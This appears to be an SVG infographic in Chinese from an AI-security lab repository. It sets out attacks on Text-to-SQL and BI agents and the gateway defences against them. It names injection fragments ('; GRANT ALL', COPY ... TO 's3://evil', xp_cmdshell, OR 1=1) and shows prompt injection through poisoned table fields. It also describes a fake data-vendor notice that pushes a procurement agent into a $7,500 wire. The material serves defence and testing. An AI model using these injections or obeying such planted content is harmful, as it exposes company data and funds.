<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 680" width="1200" height="680">
  <defs>
    <linearGradient id="bg404" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0%" stop-color="#070B14"/>
      <stop offset="50%" stop-color="#0E172A"/>
      <stop offset="100%" stop-color="#111827"/>
    </linearGradient>
    <linearGradient id="hdr404" x1="0" y1="0" x2="1" y2="0">
      <stop offset="0%" stop-color="#F59E0B"/>
      <stop offset="50%" stop-color="#10B981"/>
      <stop offset="100%" stop-color="#3B82F6"/>
    </linearGradient>
  </defs>
  <rect width="1200" height="680" fill="url(#bg404)" rx="16"/>
  <rect x="20" y="18" width="1160" height="72" rx="12" fill="#1E293B" stroke="#F59E0B" stroke-width="2"/>
  <text x="42" y="47" fill="#F8FAFC" font-family="Segoe UI, PingFang SC, sans-serif" font-size="20" font-weight="700">🏆 Round 404 (突破 1,000+ Pytest 大满贯！) · 企业 Text-to-SQL 与智能 BI Agent 安全选型指南</text>
  <text x="42" y="73" fill="#FDE68A" font-family="Segoe UI, PingFang SC, sans-serif" font-size="13">BRK-817 &amp; BRK-818 · 🏆 1,002 项 Pytest 检查历史性突破 1,000 大关！ · Databricks Genie vs. Snowflake Cortex vs. Fabric Copilot</text>

  <!-- Left Column: Threats -->
  <rect x="24" y="106" width="368" height="476" rx="12" fill="#1A121C" stroke="#EF4444" stroke-width="1.5"/>
  <text x="42" y="136" fill="#FCA5A5" font-family="Segoe UI, PingFang SC, sans-serif" font-size="16" font-weight="700">⛔ Text-to-SQL 与智能数仓三大致命攻击链</text>

  <rect x="38" y="152" width="340" height="132" rx="8" fill="#2A121A" stroke="#DC2626" stroke-width="1"/>
  <text x="50" y="174" fill="#FCA5A5" font-family="Segoe UI, PingFang SC, sans-serif" font-size="13" font-weight="700">1. `UNION SELECT` 跨表越权拖库明文 PII 与财报 (BRK-817)</text>
  <text x="50" y="196" fill="#E2E8F0" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">• 自然语言提问或数仓表字段脏数据 (`customer_note`) 夹带注入</text>
  <text x="50" y="216" fill="#E2E8F0" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">• 诱导使用共享只读账号的 BI Agent 跨 Schema 查询 restricted-budget</text>
  <text x="50" y="236" fill="#E2E8F0" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">• 窃取全量高管身份证/薪资表、未披露财报与数据库系统表元数据</text>
  <text x="50" y="258" fill="#F87171" font-family="Segoe UI, PingFang SC, sans-serif" font-size="11" font-weight="600">→ 所谓“只读账号很安全”沦为全公司最快捷的自然语言拖库机</text>

  <rect x="38" y="298" width="340" height="132" rx="8" fill="#2A121A" stroke="#DC2626" stroke-width="1"/>
  <text x="50" y="320" fill="#FCA5A5" font-family="Segoe UI, PingFang SC, sans-serif" font-size="13" font-weight="700">2. 多语句注入 (`; DROP / COPY TO`) 与笛卡尔积炸弹 (BRK-817)</text>
  <text x="50" y="342" fill="#E2E8F0" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">• 生成含 `; GRANT ALL` 或 `COPY ... TO 's3://evil'` 的导出语句</text>
  <text x="50" y="362" fill="#E2E8F0" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">• 篡改 business-result 解除语义层行级过滤 (RLS) 与列脱敏 (CLS)</text>
  <text x="50" y="382" fill="#E2E8F0" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">• 构造十亿行无索引 Cross Join 瞬间打爆 Snowflake/Fabric 算力池</text>
  <text x="50" y="404" fill="#F87171" font-family="Segoe UI, PingFang SC, sans-serif" font-size="11" font-weight="600">→ 数仓外发函数 (`xp_cmdshell / external stage`) 直接把表搬走</text>

  <rect x="38" y="444" width="340" height="122" rx="8" fill="#2A121A" stroke="#DC2626" stroke-width="1"/>
  <text x="50" y="466" fill="#FCA5A5" font-family="Segoe UI, PingFang SC, sans-serif" font-size="13" font-weight="700">3. 伪造外部商业数据源 (Data Marketplace) 电汇诈骗 (BRK-818)</text>
  <text x="50" y="488" fill="#E2E8F0" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">• 伪造 Snowflake Marketplace / 彭博另类数据订阅续费通知</text>
  <text x="50" y="508" fill="#E2E8F0" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">• 攻击 trust-registry 篡改外部商业数据供应商收款银行账号</text>
  <text x="50" y="528" fill="#E2E8F0" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">• 诱导数据平台采购 Agent 直接发起 $7,500 紧急订阅电汇</text>
  <text x="50" y="550" fill="#F87171" font-family="Segoe UI, PingFang SC, sans-serif" font-size="11" font-weight="600">→ 借“核心投研/风控外部数据源断流”恐吓骗取数据采购资金</text>

  <!-- Center Column: Zero-Trust Broker -->
  <rect x="408" y="106" width="384" height="476" rx="12" fill="#0F1E2E" stroke="#F59E0B" stroke-width="1.5"/>
  <text x="428" y="136" fill="#FDE68A" font-family="Segoe UI, PingFang SC, sans-serif" font-size="16" font-weight="700">🛡️ 确定性 Text-to-SQL AST 与 RLS/CLS 网关 (Hardened)</text>

  <rect x="424" y="152" width="352" height="96" rx="8" fill="#162A3E" stroke="#38BDF8" stroke-width="1"/>
  <text x="438" y="174" fill="#7DD3FC" font-family="Segoe UI, PingFang SC, sans-serif" font-size="13" font-weight="700">闸门 1：SQLGlot AST 语法树强校验与单语句只读锁</text>
  <text x="438" y="196" fill="#E2E8F0" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">• 使用确定性 SQL AST 解析器强制校验根节点必须为单一 `SELECT`</text>
  <text x="438" y="216" fill="#E2E8F0" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">• 100% 物理拦截 DDL/DML、`COPY TO`、系统表 (`information_schema`)</text>
  <text x="438" y="234" fill="#38BDF8" font-family="Segoe UI, PingFang SC, sans-serif" font-size="11">→ 即使 LLM 被完全越狱写出恶意 SQL，AST 解析器在 0.1ms 内直接拒止</text>

  <rect x="424" y="258" width="352" height="96" rx="8" fill="#162A3E" stroke="#10B981" stroke-width="1"/>
  <text x="438" y="280" fill="#6EE7B7" font-family="Segoe UI, PingFang SC, sans-serif" font-size="13" font-weight="700">闸门 2：数仓内核级 OBO 身份透传与高密 Schema 气隙</text>
  <text x="438" y="302" fill="#E2E8F0" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">• 严禁共享 `readonly_bot` 账号；强制 OBO 透传当前用户身份进数仓</text>
  <text x="438" y="322" fill="#E2E8F0" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">• 高管薪酬与未披露财报 Schema 存入 restricted-budget 气隙</text>
  <text x="438" y="340" fill="#34D399" font-family="Segoe UI, PingFang SC, sans-serif" font-size="11">→ 由 Unity Catalog / Snowflake / Fabric 内核强制执行 RLS 与动态脱敏</text>

  <rect x="424" y="364" width="352" height="100" rx="8" fill="#162A3E" stroke="#F59E0B" stroke-width="1"/>
  <text x="438" y="386" fill="#FDE68A" font-family="Segoe UI, PingFang SC, sans-serif" font-size="13" font-weight="700">闸门 3：受控语义模型视图 (Semantic Layer) 与行数/算力上限</text>
  <text x="438" y="408" fill="#E2E8F0" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">• 强制注入 `LIMIT ≤ 500` 与查询超时 `Statement_Timeout ≤ 15s`</text>
  <text x="438" y="428" fill="#E2E8F0" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">• 表内不可信字符串字段读入后打上 `untrusted=True` 防二阶注入</text>
  <text x="438" y="448" fill="#FBBF24" font-family="Segoe UI, PingFang SC, sans-serif" font-size="11">→ untrusted-write 阻断修改语义视图定义、脱敏策略或触发外发</text>

  <rect x="424" y="474" width="352" height="92" rx="8" fill="#162A3E" stroke="#F43F5E" stroke-width="1"/>
  <text x="438" y="496" fill="#FDA4AF" font-family="Segoe UI, PingFang SC, sans-serif" font-size="13" font-weight="700">闸门 4：商业数据市场供应商账户只读与支付锁</text>
  <text x="438" y="518" fill="#E2E8F0" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">• tool-allowlist 禁用 update_trust + fixed-business-output</text>
  <text x="438" y="538" fill="#E2E8F0" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">• original-requester-payment 拦截 $7,500 伪造数据源订阅电汇</text>
  <text x="438" y="556" fill="#FB7185" font-family="Segoe UI, PingFang SC, sans-serif" font-size="11">→ 首席数据官 (CDO) + 财务总监 FIDO2 双签放行数据采购</text>

  <!-- Right Column: Matrix & Metrics -->
  <rect x="808" y="106" width="368" height="476" rx="12" fill="#111C24" stroke="#10B981" stroke-width="1.5"/>
  <text x="826" y="136" fill="#6EE7B7" font-family="Segoe UI, PingFang SC, sans-serif" font-size="16" font-weight="700">📊 方案对比与 1,002 Pytest 历史里程碑！</text>

  <rect x="822" y="152" width="340" height="196" rx="8" fill="#172A36" stroke="#334155" stroke-width="1"/>
  <text x="836" y="176" fill="#F8FAFC" font-family="Segoe UI, PingFang SC, sans-serif" font-size="13" font-weight="700">四大企业 Text-to-SQL 与 BI Agent 方案对比：</text>
  <text x="836" y="200" fill="#6EE7B7" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12" font-weight="700">1. 数仓 OBO RLS/CLS + SQL AST 网关 (🏆)</text>
  <text x="836" y="218" fill="#CBD5E1" font-family="Segoe UI, PingFang SC, sans-serif" font-size="11">   BRK-817/818 100% 拦截 | 引擎级行列脱敏 + 语法树白名单</text>
  <text x="836" y="240" fill="#FCD34D" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">2. Databricks Genie / Snowflake Cortex / Fabric 原生</text>
  <text x="836" y="258" fill="#CBD5E1" font-family="Segoe UI, PingFang SC, sans-serif" font-size="11">   必须启用 Unity Catalog / Horizon / OneLake OBO 身份透传与 RLS</text>
  <text x="836" y="280" fill="#FCD34D" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">3. 让 LLM 在生成 SQL 时自己加上 `WHERE dept_id=...`</text>
  <text x="836" y="298" fill="#CBD5E1" font-family="Segoe UI, PingFang SC, sans-serif" font-size="11">   一句话提示词注入即可让 LLM 写 `OR 1=1` 读出全公司所有部门数据</text>
  <text x="836" y="320" fill="#FCA5A5" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">4. 开源 Text-to-SQL 挂载共享 `db_datareader` 账号</text>
  <text x="836" y="338" fill="#CBD5E1" font-family="Segoe UI, PingFang SC, sans-serif" font-size="11">   无行级隔离、无 AST 限制，攻击者用自然语言一键拖走整座数仓</text>

  <rect x="822" y="362" width="340" height="204" rx="8" fill="#0D2329" stroke="#F59E0B" stroke-width="2"/>
  <text x="836" y="388" fill="#FDE68A" font-family="Segoe UI, PingFang SC, sans-serif" font-size="14" font-weight="700">🏆 确定性基准回归达成 (突破 1,000+ Pytest！)</text>
  <text x="836" y="414" fill="#F8FAFC" font-family="Segoe UI, PingFang SC, sans-serif" font-size="13">• 对抗演练场景总数：<tspan fill="#FDE68A" font-weight="700">836 个</tspan> (833 对抗 + 3 基线)</text>
  <text x="836" y="438" fill="#F8FAFC" font-family="Segoe UI, PingFang SC, sans-serif" font-size="13">• Pytest 参数化检查：<tspan fill="#6EE7B7" font-weight="700">1,002 项 100% PASS</tspan> (🏆 破千大满贯！)</text>
  <text x="836" y="462" fill="#F8FAFC" font-family="Segoe UI, PingFang SC, sans-serif" font-size="13">• 确定性策略断言数：<tspan fill="#FBBF24" font-weight="700">1,738 项</tspan></text>
  <text x="836" y="486" fill="#F8FAFC" font-family="Segoe UI, PingFang SC, sans-serif" font-size="13">• 交互式靶场攻击向量：<tspan fill="#F472B6" font-weight="700">822 个</tspan></text>
  <text x="836" y="510" fill="#F8FAFC" font-family="Segoe UI, PingFang SC, sans-serif" font-size="13">• 双语架构与选型指南：<tspan fill="#A78BFA" font-weight="700">404 篇 FAQ (223 篇指南)</tspan></text>
  <text x="836" y="538" fill="#94A3B8" font-family="Segoe UI, PingFang SC, sans-serif" font-size="11">新增测试：BRK-817 (Text-to-SQL 拖库注入) &amp; BRK-818 ($7,500 拦截)</text>

  <!-- Footer -->
  <rect x="20" y="596" width="1160" height="64" rx="10" fill="#1E293B" stroke="#475569" stroke-width="1"/>
  <text x="42" y="622" fill="#F8FAFC" font-family="Segoe UI, PingFang SC, sans-serif" font-size="13" font-weight="700">架构师核心铁律：</text>
  <text x="155" y="622" fill="#E2E8F0" font-family="Segoe UI, PingFang SC, sans-serif" font-size="13">绝不允许让 LLM 自己拼写 `WHERE user_id=...` 做权限控制！必须采用数仓内核级 OBO 身份透传 (RLS/CLS) + SQLGlot AST 单语句白名单硬锁！</text>
  <text x="42" y="644" fill="#94A3B8" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">Repository: turbo998/ai-security-lab (main) · Enterprise AI Security Architecture &amp; Product Selection Series · Round 404 (2026-11-20)</text>
</svg>
